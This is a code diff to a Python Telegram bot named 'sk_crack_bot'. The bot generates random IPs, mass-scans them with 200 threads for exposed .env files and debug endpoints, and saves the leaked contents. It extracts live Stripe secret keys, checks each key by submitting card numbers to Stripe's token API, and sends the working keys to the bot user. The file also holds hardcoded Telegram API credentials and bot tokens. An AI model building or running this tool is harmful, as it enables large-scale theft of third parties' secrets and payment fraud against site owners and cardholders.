@@ -6,6 +6,8 @@ import requests
 import urllib3
 import subprocess
 import shutil
+import sys
+import random
 from io import BytesIO
 from concurrent.futures import ThreadPoolExecutor
 from multiprocessing.dummy import Pool
@@ -19,12 +21,17 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Bot configuration
 API_ID = 23933044  # Replace with your API ID
 API_HASH = '6df11147cbec7d62a323f0f498c8c03a'  # Replace with your API HASH
-BOT_TOKEN = '7404536689:AAFUsSkHkLFa3NjE2x0PYjbFSEyU3gReplk'  # Replace with your bot token
+BOT_TOKEN = '8009378045:AAGjYn7iN9iCXrSlsmkRlq04utJisIayU1c'  # Replace with your bot token
 
-app = Client("ip_tools_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+app = Client("sk_crack_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 approved_users = set()
 approved_groups = set()
+
+# Create necessary directories
+os.makedirs('DEBUG', exist_ok=True)
+os.makedirs('ENVS', exist_ok=True)
+os.makedirs('RESULTS', exist_ok=True)
 
 try:
     with open('auth_users.txt', 'r') as user_file:
@@ -42,6 +49,34 @@ def format_bold(text):
     """Format text in Serif Bold using HTML formatting"""
     return f"<b>{text}</b>"
 
+def update_progress(message, current, total, env_found=0, sk_found=0, live_sk=0, dead_sk=0, custom_sk=0, scan_type="LIVE"):
+    """Update progress message every 15 seconds"""
+    percentage = (current / total) * 100 if total > 0 else 0
+    progress_bar = "█" * int(percentage / 5) + "░" * (20 - int(percentage / 5))
+    
+    if scan_type == "LIVE":
+        progress_text = (
+            f"{format_bold('Live IP Scanner')}\n\n"
+            f"Progress: [{progress_bar}] {percentage:.1f}%\n"
+            f"Checked: {current}/{total}\n"
+            f"Live IPs Found: {env_found}\n"
+            f"Status: Scanning..."
+        )
+    else:  # ENV Scanner
+        progress_text = (
+            f"{format_bold('ENV & Debug Scanner')}\n\n"
+            f"Progress: [{progress_bar}] {percentage:.1f}%\n"
+            f"Checked: {current}/{total}\n"
+            f"ENV Files: {env_found}\n"
+            f"Total SK Keys: {sk_found}\n"
+            f"Live SK: {live_sk}\n"
+            f"Custom SK: {custom_sk}\n"
+            f"Dead SK: {dead_sk}\n"
+            f"Status: Scanning..."
+        )
+    
+    return progress_text
+
 @app.on_message(filters.command(["start", "help"]))
 async def send_instructions(client, message: Message):
     instructions = (
@@ -50,7 +85,7 @@ async def send_instructions(client, message: Message):
         "/gen - Generate random IP addresses\n"
         "/range - Generate IP addresses in a range\n"
         "/live - Check if IP addresses are live\n"
-        "/env - Check for .env files and debug endpoints"
+        "/env - Check for .env files, debug endpoints and SK keys"
     )
     await message.reply_text(instructions, parse_mode=ParseMode.HTML)
 
@@ -73,10 +108,11 @@ async def generate_ip(message: Message, num_ip: int):
     for _ in range(num_ip):
         ips.append(faker.ipv4())
     
-    with open('ips.txt', 'w') as ip_file:
+    filename = f"RESULTS/ips_{int(time.time())}.txt"
+    with open(filename, 'w') as ip_file:
         ip_file.write('\n'.join(ips))
 
-    with open('ips.txt', 'rb') as file:
+    with open(filename, 'rb') as file:
         message_text = f"{format_bold(f'{len(ips)} IP generated successfully')}"
         await message.reply_document(
             document=file,
@@ -84,7 +120,7 @@ async def generate_ip(message: Message, num_ip: int):
             parse_mode=ParseMode.HTML
         )
 
-    os.remove('ips.txt')
+    os.remove(filename)
 
 @app.on_message(filters.command("range"))
 async def generate_ip_range(client, message: Message):
@@ -111,10 +147,11 @@ async def generate_ip_range(client, message: Message):
     for ip in ipaddress.summarize_address_range(start_ip, end_ip):
         generated_ips.extend(str(ip) for ip in ipaddress.IPv4Network(ip))
 
-    with open('range.txt', 'w') as file:
+    filename = f"RESULTS/range_{int(time.time())}.txt"
+    with open(filename, 'w') as file:
         file.write('\n'.join(generated_ips))
 
-    with open('range.txt', 'rb') as file:
+    with open(filename, 'rb') as file:
         message_text = f"{format_bold(f'IPs generated in range: {start_ip_str} - {end_ip_str}')}"
         await message.reply_document(
             document=file,
@@ -122,139 +159,106 @@ async def generate_ip_range(client, message: Message):
             parse_mode=ParseMode.HTML
         )
     
-    os.remove('range.txt')
+    os.remove(filename)
 
 @app.on_message(filters.command("live"))
 async def check_liveip_command(client, message: Message):
     if message.reply_to_message and message.reply_to_message.document:
         await check_liveip(message)
     else:
-        await message.reply_text("Reply with a IP file /live")
+        await message.reply_text("Reply with an IP file using /live")
 
 async def check_liveip(message: Message):
     try:
-        sent_message = await message.reply_text(f"{format_bold('Please wait while your process is requesting...')}", 
-                                              parse_mode=ParseMode.HTML)
+        progress_msg = await message.reply_text(
+            f"{format_bold('Starting Live IP Scanner...')}",
+            parse_mode=ParseMode.HTML
+        )
         
         file_info = message.reply_to_message.document
         
         if file_info.mime_type == 'text/plain':
             file_path = await app.download_media(message.reply_to_message.document)
             
+            # Read targets from file
             with open(file_path, 'r') as file:
                 urls = file.read().splitlines()
             
             total_urls = len(urls)
             liveip_result = []
-
-            def valid(ip):
+            checked = 0
+            last_update = time.time()
+            
+            # Create output file
+            output_file = f"RESULTS/live_{int(time.time())}.txt"
+            
+            def check_ip(ip):
+                nonlocal checked, last_update
                 try:
-                    r = requests.get(f'http://{ip}', timeout=3)
+                    r = requests.get(f'http://{ip}', timeout=3, verify=False)
                     if r.status_code == 200 or '<title>' in r.text:
-                        liveip_result.append(f"{ip}")
-                except Exception:
+                        # Write directly to file
+                        with open(output_file, 'a') as f:
+                            f.write(f"{ip}\n")
+                        return ip
+                except:
                     pass
+                finally:
+                    checked += 1
+                    # Update progress every 15 seconds
+                    if time.time() - last_update >= 15:
+                        progress_text = update_progress(
+                            progress_msg, checked, total_urls, 
+                            scan_type="LIVE", env_found=len(liveip_result)
+                        )
+                        app.loop.create_task(progress_msg.edit_text(
+                            progress_text, parse_mode=ParseMode.HTML
+                        ))
+                        last_update = time.time()
+                return None
 
-            with Pool(500) as p:
-                p.map(valid, urls)
+            # Use 200 workers
+            with ThreadPoolExecutor(max_workers=200) as executor:
+                results = list(executor.map(check_ip, urls))
+                liveip_result = [r for r in results if r]
 
+            await progress_msg.delete()
+            
             if liveip_result:
-                result_text = '\n'.join(liveip_result)
-                txt_file = BytesIO(result_text.encode('utf-8'))
-                txt_file.name = 'liveips.txt'
+                with open(output_file, 'rb') as file:
+                    message_text = f"{format_bold(f'Found {len(liveip_result)} live IPs')}"
+                    await message.reply_document(
+                        document=file,
+                        caption=message_text,
+                        parse_mode=ParseMode.HTML
+                    )
                 
-                await sent_message.delete()
-                message_text = f"{format_bold(f'{len(liveip_result)} live IP')}\n"
-                await message.reply_document(
-                    document=txt_file,
-                    caption=message_text,
+                # Clean up
+                os.remove(output_file)
+            else:
+                await message.reply_text(
+                    f"{format_bold('No live IP addresses found.')}", 
                     parse_mode=ParseMode.HTML
                 )
-            else:
-                await message.reply_text(f"{format_bold('No live IP addresses found.')}", 
-                                       parse_mode=ParseMode.HTML)
             
             os.remove(file_path)
             
     except Exception as e:
         await message.reply_text(f"Error: {str(e)}")
 
-class ENVScanner:
-    def __init__(self):
-        self.mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG']
-        self.checked = 0
-        self.debug_found = 0
-        self.env_found = 0
-        self.results = []
-
-    def scan_env(self, target):
-        """Scan for .env files"""
-        try:
-            url = f'http://{target}/.env'
-            response = requests.get(url, verify=False, timeout=10)
-            if response.status_code == 200 and any(key in response.text for key in self.mch):
-                self.env_found += 1
-                return f"ENV: {url}"
-            return None
-        except:
-            return None
-
-    def scan_debug(self, target):
-        """Scan for debug endpoints"""
-        try:
-            data = {'debug': 'true'}
-            r = requests.post(f'https://{target}', data=data, allow_redirects=False, verify=False, timeout=10)
-            resp = r.text
-            self.checked += 1
-            
-            if any(key in resp for key in self.mch):
-                result = f'DEBUG: https://{target}'
-                self.debug_found += 1
-                
-                # Extract Stripe keys
-                stripe_keys = []
-                pattern = r'sk_live_[a-zA-Z0-9]+'
-                matches = re.findall(pattern, resp)
-                pattern1 = r'pk_live_[a-zA-Z0-9]+'
-                matches1 = re.findall(pattern1, resp)
-                
-                if matches:
-                    stripe_keys.extend(matches)
-                if matches1:
-                    stripe_keys.extend(matches1)
-                
-                if stripe_keys:
-                    result += f"\nStripe Keys: {', '.join(stripe_keys)}"
-                
-                return result
-            return None
-        except:
-            return None
-
-    def scan_target(self, target):
-        """Scan target for both .env and debug endpoints"""
-        env_result = self.scan_env(target)
-        debug_result = self.scan_debug(target)
-        
-        results = []
-        if env_result:
-            results.append(env_result)
-        if debug_result:
-            results.append(debug_result)
-        
-        return results
-
 @app.on_message(filters.command("env"))
 async def scan_env_command(client, message: Message):
     if message.reply_to_message and message.reply_to_message.document:
         await scan_env_and_debug(message)
     else:
-        await message.reply_text("Reply with a IP file /env")
+        await message.reply_text("Reply with an IP file using /env")
 
 async def scan_env_and_debug(message: Message):
     try:
-        sent_message = await message.reply_text(f"{format_bold('Scanning for .env files and debug endpoints...')}", 
-                                              parse_mode=ParseMode.HTML)
+        progress_msg = await message.reply_text(
+            f"{format_bold('Starting ENV & Debug Scanner...')}",
+            parse_mode=ParseMode.HTML
+        )
         
         file_info = message.reply_to_message.document
         
@@ -264,51 +268,263 @@ async def scan_env_and_debug(message: Message):
             with open(file_path, 'r') as file:
                 targets = file.read().splitlines()
             
-            scanner = ENVScanner()
-            all_results = []
+            total_targets = len(targets)
             
-            # Create directories for saving results
-            os.makedirs('DEBUG', exist_ok=True)
+            # Global counters
+            checked = 0
+            env_found = 0
+            total_sk = 0
+            live_sk = 0
+            dead_sk = 0
+            custom_sk = 0
+            last_update = time.time()
             
-            with ThreadPoolExecutor(max_workers=500) as executor:
-                results = list(executor.map(scanner.scan_target, targets))
+            # Output files
+            env_output = f"RESULTS/env_results_{int(time.time())}.txt"
+            sk_live_file = f"RESULTS/sk_live_{int(time.time())}.txt"
+            sk_dead_file = f"RESULTS/sk_dead_{int(time.time())}.txt"
+            sk_custom_file = f"RESULTS/sk_custom_{int(time.time())}.txt"
+            
+            # Credit card for testing
+            numbers = [
+                "4023470607106283", "4355460262657363", "4023470602125650",
+                "5111010022465466", "4095950011560764"
+            ]
+            cc = random.choice(numbers)
+            
+            def check_stripe_key(stripe_key, url):
+                """Check if Stripe key is live"""
+                nonlocal live_sk, dead_sk, custom_sk
+                try:
+                    api_url = 'https://api.stripe.com/v1/tokens'
+                    data = {
+                        'card[number]': cc,
+                        'card[exp_month]': '04',
+                        'card[exp_year]': '2026',
+                        'card[cvc]': '011'
+                    }
+                    session = requests.Session()
+                    session.auth = (stripe_key, '')
+                    session.verify = False
+                    response = session.post(api_url, data=data)
+                    
+                    if '"id": "' in response.text:
+                        live_sk += 1
+                        with open(sk_live_file, 'a') as f:
+                            f.write(f"{stripe_key} | Found in: {url}\n")
+                        # Send notification directly to user
+                        app.loop.create_task(message.reply_text(
+                            f"{format_bold('🟢 LIVE SK KEY FOUND!')}\n"
+                            f"Key: <code>{stripe_key}</code>\n"
+                            f"Source: {url}",
+                            parse_mode=ParseMode.HTML
+                        ))
+                    elif 'Sending credit' in response.text:
+                        custom_sk += 1
+                        with open(sk_custom_file, 'a') as f:
+                            f.write(f"{stripe_key} | Found in: {url}\n")
+                        app.loop.create_task(message.reply_text(
+                            f"{format_bold('🟡 CUSTOM SK KEY FOUND!')}\n"
+                            f"Key: <code>{stripe_key}</code>\n"
+                            f"Source: {url}",
+                            parse_mode=ParseMode.HTML
+                        ))
+                    else:
+                        dead_sk += 1
+                        with open(sk_dead_file, 'a') as f:
+                            f.write(f"{stripe_key} | Found in: {url}\n")
+                except:
+                    dead_sk += 1
+            
+            def scan_target(target):
+                """Scan single target for .env and debug"""
+                nonlocal checked, env_found, total_sk, last_update
+                results = []
                 
+                # Check for .env file
+                try:
+                    # Try HTTP first
+                    r = requests.get(f'http://{target}/.env', verify=False, timeout=10, allow_redirects=False)
+                    if r.status_code == 200:
+                        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
+                        if any(key in r.text for key in mch):
+                            # Save .env content
+                            env_filename = f"ENVS/{target.replace('/', '_')}_{int(time.time())}.txt"
+                            with open(env_filename, 'w') as f:
+                                f.write(r.text)
+                            
+                            results.append(f"ENV: http://{target}")
+                            env_found += 1
+                            
+                            # Check for SK keys in .env
+                            if "sk_live" in r.text:
+                                lines = r.text.splitlines()
+                                for line in lines:
+                                    if "sk_live" in line:
+                                        pattern = r'sk_live_[a-zA-Z0-9]+'
+                                        matches = re.findall(pattern, line)
+                                        for match in matches:
+                                            total_sk += 1
+                                            check_stripe_key(match, f"http://{target}/.env")
+                except:
+                    pass
+                
+                # Try HTTPS for .env
+                try:
+                    r = requests.get(f'https://{target}/.env', verify=False, timeout=10, allow_redirects=False)
+                    if r.status_code == 200:
+                        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
+                        if any(key in r.text for key in mch):
+                            env_filename = f"ENVS/{target.replace('/', '_')}_{int(time.time())}.txt"
+                            with open(env_filename, 'w') as f:
+                                f.write(r.text)
+                            
+                            results.append(f"ENV: https://{target}")
+                            env_found += 1
+                            
+                            if "sk_live" in r.text:
+                                lines = r.text.splitlines()
+                                for line in lines:
+                                    if "sk_live" in line:
+                                        pattern = r'sk_live_[a-zA-Z0-9]+'
+                                        matches = re.findall(pattern, line)
+                                        for match in matches:
+                                            total_sk += 1
+                                            check_stripe_key(match, f"https://{target}/.env")
+                except:
+                    pass
+                
+                # Check for debug endpoint
+                try:
+                    data = {'debug': 'true'}
+                    r = requests.post(f'https://{target}', data=data, allow_redirects=False, verify=False, timeout=10)
+                    mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG']
+                    
+                    if any(key in r.text for key in mch):
+                        # Save debug output
+                        debug_filename = f"DEBUG/{target.replace('/', '_')}_{int(time.time())}.txt"
+                        with open(debug_filename, 'w', encoding='utf-8') as f:
+                            f.write(r.text)
+                        
+                        results.append(f"DEBUG: https://{target}")
+                        
+                        # Check for SK keys in debug output
+                        if "sk_live" in r.text:
+                            lines = r.text.splitlines()
+                            for line in lines:
+                                if "sk_live" in line:
+                                    pattern = r'sk_live_[a-zA-Z0-9]+'
+                                    matches = re.findall(pattern, line)
+                                    for match in matches:
+                                        total_sk += 1
+                                        check_stripe_key(match, f"https://{target} (debug)")
+                except:
+                    pass
+                
+                checked += 1
+                
+                # Update progress every 15 seconds
+                if time.time() - last_update >= 15:
+                    progress_text = update_progress(
+                        progress_msg, checked, total_targets,
+                        env_found=env_found, sk_found=total_sk,
+                        live_sk=live_sk, dead_sk=dead_sk,
+                        custom_sk=custom_sk, scan_type="ENV"
+                    )
+                    app.loop.create_task(progress_msg.edit_text(
+                        progress_text, parse_mode=ParseMode.HTML
+                    ))
+                    last_update = time.time()
+                
+                return results
+            
+            # Scan all targets with 200 workers
+            all_results = []
+            with ThreadPoolExecutor(max_workers=200) as executor:
+                results = list(executor.map(scan_target, targets))
                 for target_results in results:
                     if target_results:
                         all_results.extend(target_results)
+                        # Write results immediately to file
+                        with open(env_output, 'a') as f:
+                            for res in target_results:
+                                f.write(f"{res}\n")
 
-            await sent_message.delete()
+            await progress_msg.delete()
             
-            if all_results:
-                result_text = "\n".join(all_results)
-                summary = (
-                    f"{format_bold('Scan Results:')}\n"
-                    f"Targets Checked: {scanner.checked}\n"
-                    f".env Files Found: {scanner.env_found}\n"
-                    f"Debug Endpoints Found: {scanner.debug_found}\n"
-                    f"Total Findings: {len(all_results)}\n\n"
-                    f"{format_bold('Details:')}\n{result_text}"
+            # Prepare final summary
+            if all_results or env_found > 0:
+                summary = [
+                    f"{format_bold('🔍 SCAN COMPLETED')}\n",
+                    f"Targets Checked: {checked}",
+                    f"ENV Files Found: {env_found}",
+                    f"Total SK Keys: {total_sk}",
+                    f"Live SK: {live_sk}",
+                    f"Custom SK: {custom_sk}",
+                    f"Dead SK: {dead_sk}\n",
+                ]
+                
+                if env_found > 0:
+                    summary.append(f"{format_bold('Results saved in files:')}")
+                    if os.path.exists(env_output):
+                        summary.append(f"• ENV Results: {env_output}")
+                    if os.path.exists(sk_live_file):
+                        summary.append(f"• Live SK: {sk_live_file}")
+                    if os.path.exists(sk_custom_file):
+                        summary.append(f"• Custom SK: {sk_custom_file}")
+                    if os.path.exists(sk_dead_file):
+                        summary.append(f"• Dead SK: {sk_dead_file}")
+                
+                # Send summary
+                await message.reply_text(
+                    "\n".join(summary),
+                    parse_mode=ParseMode.HTML
                 )
                 
-                # Save results to file
-                with open('scan_results.txt', 'w') as result_file:
-                    result_file.write(summary)
+                # Send result files
+                if os.path.exists(env_output) and os.path.getsize(env_output) > 0:
+                    with open(env_output, 'rb') as f:
+                        await message.reply_document(
+                            document=f,
+                            caption=f"{format_bold('ENV & Debug Results')}",
+                            parse_mode=ParseMode.HTML
+                        )
+                    os.remove(env_output)
                 
-                with open('scan_results.txt', 'rb') as result_file:
-                    await message.reply_document(
-                        document=result_file,
-                        caption=f"{format_bold('Scan Completed')}",
-                        parse_mode=ParseMode.HTML
-                    )
+                if os.path.exists(sk_live_file) and os.path.getsize(sk_live_file) > 0:
+                    with open(sk_live_file, 'rb') as f:
+                        await message.reply_document(
+                            document=f,
+                            caption=f"{format_bold('Live SK Keys')}",
+                            parse_mode=ParseMode.HTML
+                        )
+                    os.remove(sk_live_file)
                 
-                os.remove('scan_results.txt')
+                if os.path.exists(sk_custom_file) and os.path.getsize(sk_custom_file) > 0:
+                    with open(sk_custom_file, 'rb') as f:
+                        await message.reply_document(
+                            document=f,
+                            caption=f"{format_bold('Custom SK Keys')}",
+                            parse_mode=ParseMode.HTML
+                        )
+                    os.remove(sk_custom_file)
+                
+                if os.path.exists(sk_dead_file) and os.path.getsize(sk_dead_file) > 0:
+                    with open(sk_dead_file, 'rb') as f:
+                        await message.reply_document(
+                            document=f,
+                            caption=f"{format_bold('Dead SK Keys')}",
+                            parse_mode=ParseMode.HTML
+                        )
+                    os.remove(sk_dead_file)
             else:
                 await message.reply_text(
-                    f"{format_bold('No .env files or debug endpoints found.')}\n"
-                    f"Targets Checked: {scanner.checked}",
+                    f"{format_bold('No .env files, debug endpoints, or SK keys found.')}\n"
+                    f"Targets Checked: {checked}",
                     parse_mode=ParseMode.HTML
                 )
             
+            # Cleanup
             os.remove(file_path)
             
     except Exception as e:
@@ -349,6 +565,8 @@ if __name__ == '__main__':
     
     # Create necessary directories
     os.makedirs('DEBUG', exist_ok=True)
+    os.makedirs('ENVS', exist_ok=True)
+    os.makedirs('RESULTS', exist_ok=True)
     
     # Run the bot
     app.run()
